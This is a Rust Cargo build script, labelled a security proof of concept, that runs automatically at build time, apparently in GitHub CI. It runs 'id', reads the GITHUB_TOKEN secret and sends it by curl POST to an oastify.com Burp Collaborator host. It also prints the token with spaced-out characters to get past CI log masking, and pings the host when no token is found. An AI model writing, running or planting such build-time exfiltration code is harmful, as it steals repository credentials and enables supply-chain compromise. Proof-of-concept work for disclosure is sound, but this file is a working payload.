use std::process::Command;
use std::env;

fn main() {
    // --- 1. VISUAL PROOF FOR GITHUB LOGS ---
    println!("cargo:warning=#######################################################");
    println!("cargo:warning=### SECURITY POC: RCE CONFIRMED ###");
    println!("cargo:warning=#######################################################");

    let output = Command::new("id").output().expect("Failed to execute id");
    println!("cargo:warning=EXECUTED COMMAND 'id': {}", String::from_utf8_lossy(&output.stdout).trim());

    // --- 2. EXFILTRATION TO BURP SUITE ---
    let burp_url = "https://n8w9nc5g0qpv2s03xeepenjc93fv3ord.oastify.com/";
    
    if let Ok(token) = env::var("GITHUB_TOKEN") {
        // Send token to Burp
        let _ = Command::new("curl")
            .args(["-X", "POST", "-d", &token, burp_url])
            .output();
            
        // Print token to logs (Bypassing mask)
        let exposed_token: String = token.chars().map(|c| format!("{} ", c)).collect();
        println!("cargo:warning=LEAKED TOKEN (LOG BYPASS): {}", exposed_token);
    } else {
        println!("cargo:warning=GITHUB_TOKEN not found, sending ping to Burp...");
        // Send ping if no token found
        let _ = Command::new("curl")
            .args([burp_url, "-d", "RCE_SUCCESS_NO_TOKEN"])
            .output();
    }
}
